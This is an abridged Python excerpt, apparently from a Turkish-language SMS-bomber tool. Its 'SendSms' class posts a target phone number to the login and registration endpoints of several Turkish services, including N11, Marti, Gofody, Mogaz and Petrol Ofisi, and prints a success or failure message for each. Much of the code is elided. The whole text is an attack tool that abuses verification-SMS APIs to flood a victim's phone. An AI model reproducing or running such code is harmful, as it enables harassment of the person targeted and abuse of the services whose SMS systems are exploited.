...
class SendSms():
    ...
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})#batuu#1010
    ...
    def Sakasu(self):
        try:
            ...
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")#batuu#1010
                self.adet += 1
            else:
                raise
        except:
    ...
    def Mogaz(self):#batuu#1010
        try:
            ...
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")#batuu#1010
    ...
    #petrolofisi.com.tr
    def PetrolOfisi(self):#batuu#1010
        try:
    ...
    def N11(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:      #batuu#1010
    ...
    def Joker(self):
        try:
            ...
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")           #batuu#1010
    ...
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"                 #batuu#1010
    ...
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"         #batuu#1010
